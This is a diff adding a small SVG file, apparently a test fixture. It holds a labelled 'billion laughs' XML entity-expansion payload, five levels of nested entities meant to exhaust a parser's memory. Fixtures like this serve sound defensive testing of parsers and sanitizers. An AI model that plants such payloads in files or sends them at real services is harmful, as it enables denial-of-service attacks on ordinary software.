@@ -1,0 +1,14 @@
+<?xml version="1.0"?>
+<!-- Attack: "billion laughs". Nested entities expand to gigabytes and exhaust the parser's memory. -->
+<!DOCTYPE svg [
+  <!ENTITY lol "lol">
+  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <rect id="keep" width="10" height="10" fill="#004357"/>
+  <text x="10" y="50">&lol5;</text>
+</svg>
